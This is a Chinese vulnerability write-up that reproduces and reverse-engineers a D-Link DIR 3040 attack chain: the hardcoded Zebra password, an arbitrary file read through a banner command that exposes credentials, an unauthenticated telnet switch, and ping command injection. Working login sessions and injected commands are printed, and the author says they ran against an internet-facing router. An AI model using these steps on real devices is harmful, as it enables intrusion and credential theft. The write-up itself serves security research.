> 原文链接: https://www.anquanke.com//post/id/248740 


# D-Link DIR 3040 从信息泄露到 RCE


                                阅读量   
                                **24535**
                            
                        |
                        
                                                                                    



[![](https://p1.ssl.qhimg.com/t01b0876b8fa8eadabd.png)](https://p1.ssl.qhimg.com/t01b0876b8fa8eadabd.png)



作者：OneShell@知道创宇404实验室**<br>**

7月中旬，Cisco Talos安全研究员Dave MacDaniel公布了D-Link DIR 3040（固件版本1.13B03）的多个CVE漏洞的具体利用细节，这些漏洞环环相扣，从硬编码密码导致的信息泄露一步步到无需认证的RCE，具体的漏洞编号和漏洞描述如下：
- CVE-2021-12817：Zebra服务因读取任意文件设置登录banner导致的敏感信息泄露
- CVE-2021-12818：Zebra服务使用硬编码密码zebra
- CVE-2021-12819：可通过访问https://&lt;router_ip&gt;/start_telnet开启telnet，并使用管理员密码登录，其中提供的功能例如ping存在命令注入
从这三个漏洞的描述就可以看出攻击链大概就是：先使用Zebra硬编码密码登录，然后通过读取任意文件窃取管理员admin密码，再开启telnet，最后实现命令注入，将一个本来是后认证的RCE组合变成了无条件RCE。下面就先直接上图说明漏洞利用的可行性，然后再进行原理的分析。



## 攻击链复现

我手头上是有一个部署在公网的路由器DIR 3040，一开始端口是没有开启telnet的，下图是我复现漏洞成功后，没有关闭telnet。

```
# oneshell @ UbuntuDev in ~ [23:44:30] C:130
$ nmap -Pn X.X.X.X

Starting Nmap 7.60 ( https://nmap.org ) at 2021-07-22 23:44 PDT
Nmap scan report for XXX.XXX.com (X.X.X.X)
Host is up (0.28s latency).
Not shown: 995 filtered ports
PORT     STATE SERVICE
23/tcp   open  telnet
53/tcp   open  domain
80/tcp   open  http
443/tcp  open  https
2602/tcp open  ripd
```

首先使用telnet登录开启了Zebra的2601端口，使用硬编码密码zebra，实际上也是服务的默认密码，Zebra使用默认密码在06年的时候就爆出来过一些。

```
# oneshell @ UbuntuDev in ~ [23:42:09] C:1
$ telnet X.X.X.X 2601
Trying X.X.X.X...
Connected to X.X.X.X.
Escape character is '^]'.
          ___           ___           ___
         /__/\         /  /\         /  /\
        _\_ \:\       /  /::\       /  /:/_
       /__/\ \:\     /  /:/\:\     /  /:/ /\
      _\_ \:\ \:\   /  /:/~/:/    /  /:/ /::\
     /__/\ \:\ \:\ /__/:/ /:/___ /__/:/ /:/\:\
     \  \:\ \:\/:/ \  \:\/:::::/ \  \:\/:/~/:/
      \  \:\ \::/   \  \::/~~~~   \  \::/ /:/
       \  \:\/:/     \  \:\        \__\/ /:/
        \  \::/       \  \:\         /__/:/
         \__\/         \__\/         \__\/
 -----------------------------------------------------
 BARRIER BREAKER (%C, %R)
 -----------------------------------------------------
  * 1/2 oz Galliano         Pour all ingredients into
  * 4 oz cold Coffee        an irish coffee mug filled
  * 1 1/2 oz Dark Rum       with crushed ice. Stir.
  * 2 tsp. Creme de Cacao
 -----------------------------------------------------

User Access Verification

Password:
Router&gt; enable
Password:
Router# configure terminal
Router(config)# banner motd file /etc/passwd
Router(config)# exit
Router# exit
Connection closed by foreign host.
```

使用telnet再次登录，就会发现，登录提示的banner已经把/etc/passwd文件显示出来了。在/etc/passwd中的密码是以md5的形式保存的，有能力的师傅可以尝试解出来，但是，admin的明文账号密码是被保存在/var/2860_data.dat文件中的，那么设置banner到这个文件就可以成功读取到admin的明文密码，为下一步的认证RCE做准备。

这个时候访问https://&lt;router_ip&gt;/start_telnet开启路由器的测试CLI，这个页面访问的结果返回是404，不用担心，已经成功开启了设备的telnet了。然后可以使用上一步得到的admin账号密码登录，然后也可以看到，在ping那个功能处存在命令注入。

```
# oneshell @ LAPTOP-M8H23J7M in ~ [14:54:22] C:1
$ telnet X.X.X.X
Trying X.X.X.X...
Connected to X.X.X.X.
Escape character is '^]'.
D-Link login: admin
Password:
libcli test environment

router&gt; help

Commands available:
  help                 Show available commands
  quit                 Disconnect
  history              Show a list of previously run commands
  protest              protest cmd
  iwpriv               iwpriv cmd
  ifconfig             ifconfig cmd
  iwconfig             iwconfig cmd
  reboot               reboot cmd
  brctl                brctl cmd
  ated                 ated cmd
  ping                 ping cmd

router&gt; ping -c 1 8.8.8.8.;uname -a
ping: bad address '8.8.8.8.'
Linux D-Link 3.10.14+ #1 SMP Fri Aug 14 18:42:10 CST 2020 mips GNU/Linux
```



## 漏洞分析

漏洞的利用顺序是从CVE-2021-12818到CVE-2021-12817再到CVE-2021-12819，分析顺序也是按照这个来进行。顺便强调一下，这篇文章是偏向于分析，很多线索都是基于已有的漏洞信息来进行推断的，然后菜菜的我尽量去揣测挖洞大佬是怎么找出这个漏洞的，并说出自己猜测的思路，如果有不正确或者师傅们有更好的思路，还望指出来，蟹蟹！

### <a class="reference-link" name="%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90"></a>固件分析

第一步是获取到存在漏洞的固件，固件已经是最新固件了。关于从固件中提取文件系统，可以参考我之前写的这篇文章：[加密固件之依据老固件进行解密](https://genteeldevil.github.io/2021/07/22/%E5%8A%A0%E5%AF%86%E5%9B%BA%E4%BB%B6%E4%B9%8B%E4%BE%9D%E6%8D%AE%E8%80%81%E5%9B%BA%E4%BB%B6%E8%BF%9B%E8%A1%8C%E8%A7%A3%E5%AF%86/)。下面说一下如何从文件系统中先对整个路由器有个大致的了解。这个地方推荐使用[FirmWalker](https://github.com/craigz28/firmwalker)，一个对固件进行简单分析的sh脚本。分析的出来的结果太多了，就不展示出来，直接简单说一下分析结果：
- 后台使用的是lighttpd，一个常见的嵌入式后端。
- 看到有使用sqlite3的so，可能使用到了相关的，不知道有没有命令注入的可能。
- 有telnetd程序，可以通过telnet登录；有tftp、curl，可以用于下载文件，例如针对路由器架构编译的恶意程序。
### <a class="reference-link" name="CVE-2021-12818%EF%BC%9AZebra%E6%9C%8D%E5%8A%A1%E7%A1%AC%E7%BC%96%E7%A0%81%E5%AF%86%E7%A0%81"></a>CVE-2021-12818：Zebra服务硬编码密码

这个漏洞是Zebra服务使用了默认密码zebra。Zebra 是一个 IP 路由管理器，可提供内核路由表更新、接口查找以及不同路由协议之间路由的重新分配。DIR-3040 默认在TCP端口2601上运行此服务，任何人都可以访问。漏洞披露者的分析应该是建立在通过UART等方式或者手中还有RCE漏洞获取shell查看到的，此处分析不了就直接进行后验证，直接通过前面的命令注入漏洞查看配置文件/tmp/zebra.conf

```
router&gt; ping -c -1 8.8.8.8;cat /tmp/zebra.conf
ping: invalid number '-1'
hostname Router
password zebra
enable password zebra
```

### <a class="reference-link" name="CVE-2021-12817%EF%BC%9A%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"></a>CVE-2021-12817：敏感信息泄露

Zebra提供了一个功能就是从指定目录的文件内容，设置登录提示的banner，通过这个功能可以读取敏感信息并显示。通过find找到zebra和zebli.so，分别在/sbin/zebra和/lib/libzebra.so.1.0.0中，然后可以通过IDA搜索关键字符，例如在libzebra.so中就找到了和banner相关的数据结构。

```
.data:0006D608 banner_motd_file_cmd:.word aBannerMotdFile_1
.data:0006D608                                          # DATA XREF: LOAD:00003AC0↑o
.data:0006D608                                          # cmd_init+708↑o ...
.data:0006D608                                          # "banner motd file [FILE]"
.data:0006D60C                 .word sub_1509C
.data:0006D610                 .word aSetBannerBanne    # "Set banner\nBanner for motd\nBanner fro"...
.data:0006D614                 .align 4
.data:0006D620                 .globl no_config_log_timestamp_precision_cmd
```

这个数据结构在cmd_init是这样进行引用的：

```
install_element(5, (int)&amp;banner_motd_file_cmd);
```

zebra是一个开源项目，源代码官网ftp已经没有了，在GitHub上找到了一个[备份](https://github.com/zhouyangchao/zebra-dev)，也可以找到install_element的函数以及cmd_element结构体定义如下：

```
install_element (enum node_type ntype, struct cmd_element *cmd)
`{`
  struct cmd_node *cnode;

  cnode = vector_slot (cmdvec, ntype);

  if (cnode == NULL) 
    `{`
      fprintf (stderr, "Command node %d doesn't exist, please check it\n",
           ntype);
      exit (1);
    `}`

  vector_set (cnode-&gt;cmd_vector, cmd);

  cmd-&gt;strvec = cmd_make_descvec (cmd-&gt;string, cmd-&gt;doc);
  cmd-&gt;cmdsize = cmd_cmdsize (cmd-&gt;strvec);
`}`
struct cmd_element 
`{`
  char *string;            /* Command specification by string. */
  int (*func) (struct cmd_element *, struct vty *, int, char **);
  char *doc;            /* Documentation of this command. */
  int daemon;                   /* Daemon to which this command belong. */
  vector strvec;        /* Pointing out each description vector. */
  int cmdsize;            /* Command index count. */
  char *config;            /* Configuration string */
  vector subconfig;        /* Sub configuration string */
`}`;
```

通过对应IDA和zebra源码中的结构体，可以猜测出来，回调函数是注册在sub_1509c这个函数，大概传入的参数就是：

```
int sub_1509c(struct cmd_element *, struct vty *, int, char **);
```

其中和文件描述符相关的是结构体vty，具体就不展开了，师傅们分析可以到zebra源码中去查看结构体vty的定义，这个结构体中是具体的一个zebra会话状态的相关描述，例如会话的权限、输入命令长度、命令缓冲区、历史命令等等。其实这个地方我分析得不是很明了，源码的执行逻辑还是有点绕，猜测安全研究人员应该是根据命令的提示，发现可以通过文件设置banner，然后尝试读取文件，或者研究人员有过类似的开发研究经历。

### <a class="reference-link" name="CVE-2021-12819%EF%BC%9A%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83CLI%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"></a>CVE-2021-12819：测试环境CLI命令执行

首先分析是如何开启telnet的，通过访问https://&lt;router_ip&gt;/start_telnet即可，似乎不涉及到使用了某个CGI，那么直接在后端服务器lighttpd中去搜寻关键字telnet，查看字符串的交叉引用，然后看看执行逻辑。使用IDA可以看到，在函数`http_request_parse`中，有一段代码逻辑是：

```
if ( strstr(v13, "/start_telnet") )
`{`
  log_error_write(a1, "request.c", 460, "s", "start telnet", v190, v191, v211, v231, v251);
  system("telnetd -b 0.0.0.0");
`}`
```

接下来是分析，命令执行是如何发生的。命令执行漏洞是发生在cli中，那么可以先定位到cli和cli使用的so文件。使用find可以找到两个可疑的两个目标，/lib/libcli.so和/usr/bin/cli。先看可执行文件cli，通过搜索ping关键字可以直接定位到关键代码。

```
cli_register_command(cli_session, 0, "protest", cmd_protest, 0, 0, "protest cmd");
cli_register_command(cli_session, 0, "iwpriv", cmd_iwpriv, 0, 0, "iwpriv cmd");
cli_register_command(cli_session, 0, "ifconfig", cmd_ifconfig, 0, 0, "ifconfig cmd");
cli_register_command(cli_session, 0, "iwconfig", cmd_iwconfig, 0, 0, "iwconfig cmd");
cli_register_command(cli_session, 0, "reboot", cmd_reboot, 0, 0, "reboot cmd");
cli_register_command(cli_session, 0, "brctl", cmd_brctl, 0, 0, "brctl cmd");
cli_register_command(cli_session, 0, "ated", cmd_ated, 0, 0, "ated cmd");
cli_register_command(cli_session, 0, "ping", cmd_ping, 0, 0, "ping cmd");
cli_register_command(cli_session, 0, "sh", cmd_shell, 15, 0, "sh cmd");
```

好家伙，还没有去符号表，和前面复现中cli的显示基本一致了。一般这种实现都是注册了某个回调函数，例如cmd_ping，可以在IDA中进入查看。非常巧合的是，我去搜索了一下这个函数，发现是Github上的一个开源[libcli](https://github.com/dparrish/libcli/)项目的，这就极大降低了逆向的难度。平常在做研究的时候也可以通过去找设备开发的GPL协议，然后定位使用了什么开源项目，降低逆向难度。如下是开源的函数原型，可以看到cmd_ping函数就是注册的回调，是选择了命令后具体执行的函数。

```
struct cli_command *cli_register_command(struct cli_def *cli, struct cli_command *parent, const char *command,
                                         int (*callback)(struct cli_def *, const char *, char **, int), int privilege,
                                         int mode, const char *help)

```

进一步的关键函数调用链就是：cmd_ping -&gt; systemCmd -&gt; popen，感兴趣的师傅可以进入具体查看，也没有什么复杂的绕过，直接就是格式化字符串然后到popen执行。

猜测这一个CVE实际上是开发人员原本为了方便测试设置的，从开启telnet到使用测试CLI执行命令。CLI在登录的时候也有明确提示，属于测试CLI。然后在实际交付代码的时候却没有把相关代码去掉。



## 小结

本篇文章首先对一连串的漏洞进行了复现，实现了从敏感信息泄露到远程RCE的过程。然后从逆向结合能够查找到的相关开源组件源码，对漏洞进行了分析。期间还是走了很多弯路，用了不短的时间去分析执行逻辑、回调函数之类的，最后深一步理解到了查找研究目标GPL相关开源组件代码，进一步降低逆向难度的重要性。
